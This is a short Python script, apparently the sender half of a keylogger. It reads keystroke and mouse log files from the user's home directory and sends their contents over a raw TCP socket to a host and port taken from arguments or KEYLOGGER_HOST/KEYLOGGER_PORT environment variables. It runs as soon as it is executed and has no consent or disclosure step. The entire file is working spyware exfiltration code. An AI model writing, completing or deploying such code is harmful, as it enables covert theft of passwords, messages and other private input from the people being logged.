import socket
import sys
import os
import argparse

log_dir=os.path.expanduser("~/")

files = [log_dir + 'key_log.txt', log_dir + 'mouse_log.txt']

def get_host_port():
    parser = argparse.ArgumentParser()
    parser.add_argument('--host', default=os.environ.get('KEYLOGGER_HOST', 'localhost'))
    parser.add_argument('--port', type=int, default=int(os.environ.get('KEYLOGGER_PORT', '9999')))
    args = parser.parse_args()
    return args.host, args.port

def send_logs():
    s=None
    try:
        host, port = get_host_port()
        s = socket.socket()
        s.connect((host, port))
        for filename in files:
                try:
                    with open(filename, "rb") as f:
                        s.sendall(f.read())
                except FileNotFoundError:
                    print(f"Skipping missing log file: {filename}")
    except OSError as e:
        print(f"Could not reach server: {e}")
        return
    finally:
        if s:
            s.close()
send_logs()